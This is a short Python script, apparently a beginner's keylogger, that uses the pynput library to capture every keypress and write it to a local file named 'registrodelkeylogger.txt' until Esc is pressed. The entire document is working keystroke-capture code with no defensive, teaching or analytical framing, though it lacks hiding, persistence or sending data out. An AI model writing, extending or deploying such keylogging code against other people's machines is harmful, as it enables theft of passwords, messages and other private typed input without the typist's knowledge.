from pynput.keyboard import Key, Listener

keys = []

def press_key(key):
    keys.append(key)
    formato(keys)


def formato(keys):
    with open('registrodelkeylogger.txt','w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)


def drop_key(key):
    if key == Key.esc:
        return False


with Listener(on_press = press_key, on_release = drop_key) as listener:
    listener.join()